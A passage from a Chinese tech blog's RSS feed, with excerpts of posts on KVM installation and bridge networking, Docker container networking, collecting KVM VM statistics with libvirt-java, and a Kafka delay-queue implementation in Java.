&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector size &lt;span style="color:#f92672">(&lt;/span>logical/physical&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">512&lt;/span> bytes / &lt;span style="color:#ae81ff">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I/O size &lt;span style="color:#f92672">(&lt;/span>minimum/optimal&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">512&lt;/span> bytes / &lt;span style="color:#ae81ff">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Disk /dev/mapper/cl-swap: &lt;span style="color:#ae81ff">2&lt;/span> GiB, &lt;span style="color:#ae81ff">2147483648&lt;/span> bytes, &lt;span style="color:#ae81ff">4194304&lt;/span> sectors
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Units: sectors of &lt;span style="color:#ae81ff">1&lt;/span> * 512 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Sector size &lt;span style="color:#f92672">(&lt;/span>logical/physical&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">512&lt;/span> bytes / &lt;span style="color:#ae81ff">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>I/O size &lt;span style="color:#f92672">(&lt;/span>minimum/optimal&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">512&lt;/span> bytes / &lt;span style="color:#ae81ff">512&lt;/span> bytes
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到这台虚拟机的磁盘大小已经有100GB了，但分区大小还是没有变化，只有初始大小20GB。&lt;/p></description></item><item><title>Linux虚拟化技术KVM</title><link>https://www.typesafe.cn/posts/linux-kvm/</link><pubDate>Sat, 29 May 2021 17:07:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/linux-kvm/</guid><description>&lt;p>在Windows平台上我们习惯于使用VmWare或者virtual box来实现虚拟化，虽然它们拥有Linux版本，但大多数企业都选择了使用KVM来做Linux平台的虚拟化，因此学习掌握KVM是一项必不可少的技能。&lt;/p>
&lt;h3 id="安装kvm">安装KVM&lt;/h3>
&lt;p>以centos为例，下面是安装KVM虚拟化的命令。&lt;/p>
&lt;pre tabindex="0">&lt;code>yum install -y qemu-kvm libvirt virt-install bridge-utils
&lt;/code>&lt;/pre>&lt;p>&lt;strong>这么多软件都是什么作用？&lt;/strong>&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>软件&lt;/th>
 &lt;th>作用&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>qemu-kvm&lt;/td>
 &lt;td>整合了QEMU 和 KVM 的一个软件。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>libvirt&lt;/td>
 &lt;td>封装了QEMU的接口，可以更加方便的操作虚拟机，并且提供了很多种编程语言的SDK。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>virt-install&lt;/td>
 &lt;td>用来创建虚拟机的命令行工具。&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>bridge-utils&lt;/td>
 &lt;td>Linux网桥，用来配置虚拟机的桥接网络。&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;p>&lt;strong>kvm、qemu、qemu-kvm和libvirt到底有什么关系？&lt;/strong>&lt;/p>
&lt;p>KVM（Kernel Virtual Machine）是Linux的一个内核驱动模块，它需要CPU的支持，采用硬件辅助虚拟化技术Intel-VT、AMD-V；内存相关如Intel的EPT和AMD的RVI技术，使得它能够让Linux主机成为一个Hypervisor（虚拟机监控器）。&lt;/p>
&lt;p>QEMU是一个纯软件实现的虚拟机，它可以模拟CPU、内存、磁盘等其他硬件，让虚拟机认为自己底层就是硬件，其实这些都是QEMU模拟的，虚拟机的所有操作都要经过QEMU转译一层，也就导致了QEMU本身的性能较差。&lt;/p>
&lt;p>qemu-kvm是QEMU整合了KVM，把CPU虚拟化和内存虚拟化交给了KVM来做，自己来模拟IO设备，例如网卡和磁盘。这一套组合拳打下来，性能损失大大降低，相较于直接使用硬件，带来的损耗大概在1%-2%之间。&lt;/p>
&lt;p>libvirt是目前使用最为广泛的对KVM虚拟机进行管理的工具和API。Libvirtd是一个daemon进程，可以被本地的virsh调用，也可以被远程的virsh调用，Libvirtd调用qemu-kvm操作虚拟机。&lt;/p>
&lt;p>&lt;strong>启动libvirt&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>systemctl start libvirtd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>systemctl enable libvirtd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>如果你不想使用命令行工具来管理虚拟机，可以安装 virt-manager 。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>yum install -y virt-manager
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>在支持x11转发的ssh客户端（例如：&lt;a href="https://mobaxterm.mobatek.net/">MobaXterm&lt;/a>）上可以直接输入 virt-manager 来启动。&lt;/p>
&lt;h3 id="虚拟网络类型">虚拟网络类型&lt;/h3>
&lt;p>和vmware类型，kvm也支持多种类型的网络，主要分为三种。&lt;/p>
&lt;ol>
&lt;li>
&lt;p>&lt;strong>NAT模式&lt;/strong> 虚拟机需要把流量发送到宿主机，宿主机器转换网络信息后再发出，外部机器无法感知到虚拟机的存在。此种方式宿主机器相当于一个路由器，因此宿主机上会有一个和虚拟机同网段的IP，并且虚拟机的网关地址是宿主机的这个IP。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>主机模式&lt;/strong> 虚拟机只能互相访问，不能访问宿主机。此种方式与NAT模式类似，但它没有与虚拟机同网段的IP，因此虚拟机也不能借助于宿主机来访问外部网络。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>桥接模式&lt;/strong> 虚拟机和宿主机都关联在一个网桥上，因此虚拟机可以与宿主机在同一个网段，并且外部机器可以直接访问到虚拟机，虚拟机也可以借助网桥来访问外部网络。&lt;/p>
&lt;blockquote>
&lt;p>还有一种模式在openstack等云平台上使用较为广泛，网桥上绑定的物理网卡没有IP，对应交换机配置端口为trunk模式，虚拟机 端口连接到网桥上，并配置端口不同的VLAN tag以达到隔离和互联的目的。&lt;/p>&lt;/blockquote>
&lt;/li>
&lt;/ol>
&lt;p>NAT模式和主机模式都无需单独配置，接下来我们看下如何配置桥接网络。&lt;/p>
&lt;h3 id="配置桥接网络">配置桥接网络&lt;/h3>
&lt;p>物理网卡绑定到网桥上之后就会导致网络断开，因此我们需要把原IP配置到网桥上。&lt;/p>
&lt;pre tabindex="0">&lt;code># 进入网卡配置文件夹
cd /etc/sysconfig/network-scripts/
# 拷贝原网卡配置文件作为桥接网卡
cp ifcfg-enp134s0f0 ifcfg-br0
&lt;/code>&lt;/pre>&lt;p>修改 &lt;code>ifcfg-br0&lt;/code> 中的 &lt;code>TYPE=Ethernet&lt;/code> 为 &lt;code> TYPE=Bridge&lt;/code>，最终效果如下：&lt;/p></description></item><item><title>容器网络——如何为docker添加网卡？</title><link>https://www.typesafe.cn/posts/how-to-add-port-for-docker/</link><pubDate>Sun, 23 May 2021 13:37:00 +0800</pubDate><guid>https://www.typesafe.cn/posts/how-to-add-port-for-docker/</guid><description>&lt;p>之前我们介绍&lt;code>Network Namespace&lt;/code>（以下简称&lt;code>netns&lt;/code>）和&lt;code>veth pair&lt;/code>时说过&lt;code>docker&lt;/code>是使用这些技术来实现的网络隔离，今天我们就来一探究竟，看下&lt;code>docker&lt;/code>到底是如何做到的。&lt;/p>
&lt;h3 id="启动一个无网络的容器">启动一个无网络的容器&lt;/h3>
&lt;p>首先我们使用 &lt;code>--net=none&lt;/code> 参数启动一个无网络的容器，为了方便调试，这里我们使用了&lt;code>centos&lt;/code>镜像。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>docker run -itd --name centos-test --net&lt;span style="color:#f92672">=&lt;/span>none centos
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>启动成功之后我们进入容器内部确认一下是否无网卡。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>root@localhost ~&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#75715e"># docker ps&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>28dc2e8853df centos &lt;span style="color:#e6db74">&amp;#34;/bin/bash&amp;#34;&lt;/span> &lt;span style="color:#ae81ff">24&lt;/span> seconds ago Up &lt;span style="color:#ae81ff">23&lt;/span> seconds centos-test
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>root@localhost ~&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#75715e"># docker exec -it 28dc2e8853df bash&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>root@28dc2e8853df /&lt;span style="color:#f92672">]&lt;/span>&lt;span style="color:#75715e"># ip a&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>1: lo: &amp;lt;LOOPBACK,UP,LOWER_UP&amp;gt; mtu &lt;span style="color:#ae81ff">65536&lt;/span> qdisc noqueue state UNKNOWN group default qlen &lt;span style="color:#ae81ff">1000&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inet 127.0.0.1/8 scope host lo
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> valid_lft forever preferred_lft forever
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到确实只有一个本地环回网卡。&lt;/p></description></item><item><title>使用libvirt-java采集KVM虚拟机状态信息</title><link>https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/</link><pubDate>Wed, 19 May 2021 20:18:20 +0800</pubDate><guid>https://www.typesafe.cn/posts/collect-vm-stats-by-libvirt-java/</guid><description>&lt;p>虚拟化开发相较于普通开发是一个冷门的方向，大多数是使用Python开发，其中使用Java来做虚拟化的少之又少，资料更是少的可怜，为了实现需求我也是踩了不少坑，今天就为大家分享一下如何使用 &lt;code>libvirt-java&lt;/code> 来采集KVM虚拟机的资源使用信息。&lt;/p>
&lt;h3 id="cpu使用率">CPU使用率&lt;/h3>
&lt;p>&lt;code>libvirt&lt;/code>并没有直接提供获取虚拟机CPU使用率的接口，需要我们自己来计算，网上分享的代码或者公式五花八门，大部分都是错误的，经过我的测试，找到了一个相对准确的计算公式。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-latex" data-lang="latex">&lt;span style="display:flex;">&lt;span>cpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Java代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// t秒前的CPU时间&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> c1 &lt;span style="color:#f92672">=&lt;/span> domain.&lt;span style="color:#a6e22e">getInfo&lt;/span>().&lt;span style="color:#a6e22e">cpuTime&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Thread.&lt;span style="color:#a6e22e">sleep&lt;/span>(1000);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 当前CPU时间&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">long&lt;/span> c2 &lt;span style="color:#f92672">=&lt;/span> domain.&lt;span style="color:#a6e22e">getInfo&lt;/span>().&lt;span style="color:#a6e22e">cpuTime&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 虚拟CPU数量&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> vCpus &lt;span style="color:#f92672">=&lt;/span> domain.&lt;span style="color:#a6e22e">getMaxVcpus&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// t 为1秒&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Double cpuUsage &lt;span style="color:#f92672">=&lt;/span> 100 &lt;span style="color:#f92672">*&lt;/span> (c2 &lt;span style="color:#f92672">-&lt;/span> c1) &lt;span style="color:#f92672">/&lt;/span> (1 &lt;span style="color:#f92672">*&lt;/span> vCpus &lt;span style="color:#f92672">*&lt;/span> Math.&lt;span style="color:#a6e22e">pow&lt;/span>(10, 9));
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>log.&lt;span style="color:#a6e22e">debug&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;虚拟机[{}]CPU使用率为: {}&amp;#34;&lt;/span>, uuid, cpuUsage);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="内存使用率">内存使用率&lt;/h3>
&lt;p>不要使用&lt;code>domain.getInfo()&lt;/code>返回的 &lt;code>memory&lt;/code>字段，虽然它注释写的是&lt;code>the memory in KBytes used by the domain&lt;/code>，但它的意思真的不是虚拟机内部进程已使用的内存大小，而是从宿主机器的角度来看分配给这个虚拟机的内存它使用了多少，如果没有特殊配置，它会和&lt;code>maxMem&lt;/code>字段的值是相同的。&lt;/p>
&lt;p>正确做法是使用&lt;code>domain.memoryStats(10)&lt;/code>来获取，那为什么参数要输入一个&lt;code>10&lt;/code>呢？这是因为&lt;code>10&lt;/code>代表的是要返回的信息数量，经过我手动执行&lt;code>virsh dommemstat uuid&lt;/code> 测试发现有10个参数返回，所以需要填入&lt;code>10&lt;/code>。另外命令返回的&lt;code>unused&lt;/code> 字段值与数组中&lt;code>tag=8&lt;/code>的数据一致，最终我们获取到了未使用的内存大小，计算内存使用率更是轻轻松松。&lt;/p>
&lt;p>Java代码如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>MemoryStatistic&lt;span style="color:#f92672">[]&lt;/span> memoryStatistics &lt;span style="color:#f92672">=&lt;/span> domain.&lt;span style="color:#a6e22e">memoryStats&lt;/span>(10);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Optional&lt;span style="color:#f92672">&amp;lt;&lt;/span>MemoryStatistic&lt;span style="color:#f92672">&amp;gt;&lt;/span> first &lt;span style="color:#f92672">=&lt;/span> Arrays.&lt;span style="color:#a6e22e">stream&lt;/span>(memoryStatistics).&lt;span style="color:#a6e22e">filter&lt;/span>(x &lt;span style="color:#f92672">-&amp;gt;&lt;/span> x.&lt;span style="color:#a6e22e">getTag&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> 8).&lt;span style="color:#a6e22e">findFirst&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> (first.&lt;span style="color:#a6e22e">isPresent&lt;/span>()) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> MemoryStatistic memoryStatistic &lt;span style="color:#f92672">=&lt;/span> first.&lt;span style="color:#a6e22e">get&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> unusedMemory &lt;span style="color:#f92672">=&lt;/span> memoryStatistic.&lt;span style="color:#a6e22e">getValue&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">long&lt;/span> maxMemory &lt;span style="color:#f92672">=&lt;/span> domain.&lt;span style="color:#a6e22e">getMaxMemory&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">double&lt;/span> memoryUsage &lt;span style="color:#f92672">=&lt;/span> (maxMemory &lt;span style="color:#f92672">-&lt;/span> unusedMemory) &lt;span style="color:#f92672">*&lt;/span> 100.&lt;span style="color:#a6e22e">0&lt;/span> &lt;span style="color:#f92672">/&lt;/span> maxMemory;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> log.&lt;span style="color:#a6e22e">debug&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;虚拟机[{}]内存使用率为: {}&amp;#34;&lt;/span>, uuid, memoryUsage);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="网卡数据包信息">网卡数据包信息&lt;/h3>
&lt;p>同样&lt;code>libvirt&lt;/code>并没有提供获取虚拟机网卡的接口，因此需要获取虚拟机的xml文件来查询。&lt;/p></description></item><item><title>基于kafka实现延迟队列</title><link>https://www.typesafe.cn/posts/kafka-delay-queue/</link><pubDate>Sun, 18 Apr 2021 00:08:38 +0800</pubDate><guid>https://www.typesafe.cn/posts/kafka-delay-queue/</guid><description>&lt;h1 id="基于kafka实现延迟队列">基于kafka实现延迟队列&lt;/h1>
&lt;p>kafka作为一个使用广泛的消息队列，很多人都不会陌生，但当你在网上搜索“kafka 延迟队列”，出现的都是一些讲解时间轮或者只是提供了一些思路，并没有一份真实可用的代码实现，今天我们就来打破这个现象，提供一份可运行的代码，抛砖引玉，吸引更多的大神来分享。&lt;/p>
&lt;h3 id="基于kafka如何实现延迟队列">基于kafka如何实现延迟队列？&lt;/h3>
&lt;p>想要解决一个问题，我们需要先分解问题。kafka作为一个高性能的消息队列，只要消费能力足够，发出的消息都是会立刻收到的，因此我们需要想一个办法，让消息延迟发送出去。&lt;/p>
&lt;p>网上已经有大神给出了如下方案：&lt;/p>
&lt;ol>
&lt;li>在发送延迟消息时不直接发送到目标topic，而是发送到一个用于处理延迟消息的topic，例如&lt;code>delay-minutes-1&lt;/code>&lt;/li>
&lt;li>写一段代码拉取&lt;code>delay-minutes-1&lt;/code>中的消息，将满足条件的消息发送到真正的目标主题里。&lt;/li>
&lt;/ol>
&lt;p>就像画一匹马一样简单。&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/uPic/%E6%80%8E%E6%A0%B7%E7%94%BB%E9%A9%AC.jpeg" alt="怎样画马">&lt;/p>
&lt;p>方案是好的，但是我们还需要更多细节。&lt;/p>
&lt;h3 id="完善细节">完善细节&lt;/h3>
&lt;p>&lt;strong>问题出在哪里？&lt;/strong>&lt;/p>
&lt;p>问题出在延迟消息发出去之后，代码程序就会立刻收到延迟消息，要如何处理才能让延迟消息等待一段时间才发送到真正的topic里面。&lt;/p>
&lt;p>可能有同学会觉得很简单嘛，在代码程序收到消息之后判断条件不满足，就调用&lt;code>sleep&lt;/code>方法，过了一段时间我再进行下一个循环拉取消息。&lt;/p>
&lt;p>&lt;strong>真的可行吗?&lt;/strong>&lt;/p>
&lt;p>一切好像都很美好，但这是不可行的。&lt;/p>
&lt;p>这是因为在轮询kafka拉取消息的时候，它会返回由&lt;code>max.poll.records&lt;/code>配置指定的一批消息，但是当程序代码不能在&lt;code>max.poll.interval.ms&lt;/code>配置的期望时间内处理这些消息的话，kafka就会认为这个消费者已经挂了，会进行&lt;code>rebalance&lt;/code>，同时你这个消费者就无法再拉取到任何消息了。&lt;/p>
&lt;p>举个例子：当你需要一个24小时的延迟消息队列，在代码里面写下了&lt;code>Thread.sleep(1000*60*60*24);&lt;/code>，为了不发生&lt;code>rebalance&lt;/code>，你把&lt;code>max.poll.interval.ms&lt;/code> 也改成了&lt;code>1000*60*60*24&lt;/code>，这个时候你或许会感觉到一丝丝的怪异，我是谁？我在哪？我为什么要写出来这样的代码？&lt;/p>
&lt;p>&lt;strong>其实我们可以更优雅的处理这个问题。&lt;/strong>&lt;/p>
&lt;p>KafkaConsumer 提供了暂停和恢复的API函数，调用消费者的暂停方法后就无法再拉取到新的消息，同时长时间不消费kafka也不会认为这个消费者已经挂掉了。另外为了能够更加优雅，我们会启动一个定时器来替换&lt;code>sleep&lt;/code>。，完整流程如下图，当消费者发现消息不满足条件时，我们就暂停消费者，并把偏移量seek到上一次消费的位置以便等待下一个周期再次消费这条消息。&lt;/p>
&lt;p>&lt;img src="https://oss.typesafe.cn/uPic/kafka-delay-queue.png" alt="kafka-delay-queue">&lt;/p>
&lt;h3 id="java代码实现">Java代码实现&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.fasterxml.jackson.core.JsonProcessingException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.fasterxml.jackson.databind.JsonNode;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> com.fasterxml.jackson.databind.ObjectMapper;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.kafka.clients.consumer.*;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.kafka.clients.producer.KafkaProducer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.kafka.clients.producer.ProducerConfig;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.kafka.clients.producer.ProducerRecord;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.kafka.common.TopicPartition;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.kafka.common.serialization.StringDeserializer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.apache.kafka.common.serialization.StringSerializer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.junit.jupiter.api.BeforeEach;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.junit.jupiter.api.Test;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> org.springframework.boot.test.context.SpringBootTest;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.time.Duration;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.util.*;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> java.util.concurrent.ExecutionException;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">@SpringBootTest&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">DelayQueueTest&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> KafkaConsumer&lt;span style="color:#f92672">&amp;lt;&lt;/span>String, String&lt;span style="color:#f92672">&amp;gt;&lt;/span> consumer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> KafkaProducer&lt;span style="color:#f92672">&amp;lt;&lt;/span>String, String&lt;span style="color:#f92672">&amp;gt;&lt;/span> producer;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">volatile&lt;/span> Boolean exit &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> Object lock &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Object();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> String servers &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@BeforeEach&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">initConsumer&lt;/span>() {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Properties props &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Properties();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#a6e22e">put&lt;/span>(ConsumerConfig.&lt;span style="color:#a6e22e">BOOTSTRAP_SERVERS_CONFIG&lt;/span>, servers);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#a6e22e">put&lt;/span>(ConsumerConfig.&lt;span style="color:#a6e22e">GROUP_ID_CONFIG&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;d&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#a6e22e">put&lt;/span>(ConsumerConfig.&lt;span style="color:#a6e22e">ENABLE_AUTO_COMMIT_CONFIG&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;false&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#a6e22e">put&lt;/span>(ConsumerConfig.&lt;span style="color:#a6e22e">AUTO_OFFSET_RESET_CONFIG&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;earliest&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#a6e22e">put&lt;/span>(ConsumerConfig.&lt;span style="color:#a6e22e">ISOLATION_LEVEL_CONFIG&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;read_committed&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> props.&lt;span style="color:#a6e22e">put&lt;/span>(ConsumerConfig.&lt;span style="color:#a6e22e">MAX_POLL_INTERVAL_MS_CONFIG&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;5000&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> consumer &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> KafkaConsumer&lt;span style="color:#f92672">&amp;lt;&amp;gt;&lt;/span>(props, &lt;span style="color:#66d9ef">new&lt;/span> StringDeserializer(), &lt;span style="color:#66d9ef">new&lt;/span> StringDeserializer());
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@BeforeEach&lt;/span>
